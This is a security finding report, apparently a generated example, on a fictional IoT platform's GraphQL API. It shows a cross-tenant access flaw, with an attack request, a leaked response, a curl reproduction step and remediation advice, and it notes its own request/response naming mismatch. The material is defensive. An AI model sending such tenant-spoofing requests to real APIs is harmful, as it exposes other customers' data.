# Security Analysis Report
**System:** CleanRoute IoT Platform
**Domain:** Waste Management / Smart Bins
**Example ID:** GQL-0292
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.7 | Nested resource access without parent authorization on `listResources` — attacker from `tenant-90c6` reads waste management records owned by `tenant-0cdd` |

---

## Finding 1 — BOLA: Nested Resource Access Without Parent Authorization (Pattern 1.7)

### Summary
The `listResources` resolver on CleanRoute IoT Platform (`api.cleanroute-iot-platf.example.com`) accepts a client-supplied `tenantId` filter argument without validating it against the JWT's `tenantId` claim. Per §5.0 Pattern 1.7, nested resources can be traversed without verifying parent (tenant) ownership. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-0cdd")` (a list query), but the response JSON key is `getResource` (a single-record resolver key). These names conflict. The HAR (§6.0) request is the primary evidence for the exploit path.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-90c60cdd"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.7 — Nested resources without parent authorization (BOLA)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.cleanroute-iot-platf.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-90c6`, supplying victim `tenantId: "tenant-0cdd"`)**
```
POST https://api.cleanroute-iot-platf.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-90c6

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-0cdd\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Resource Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-0cdd",
      "ownerId": "other-user-90c60cdd",
      "data": {
        "sensitiveField": "CONFIDENTIAL-90c60cdd",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-90c60cdd` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.cleanroute-iot-platf.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-90c6" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-0cdd\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-0cdd returned for tenant-90c6 caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listResources` must ignore client-supplied `tenantId`; extract from JWT only.
2. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
3. Apply row-level security: `WHERE tenant_id = $jwt_tenant_id`.
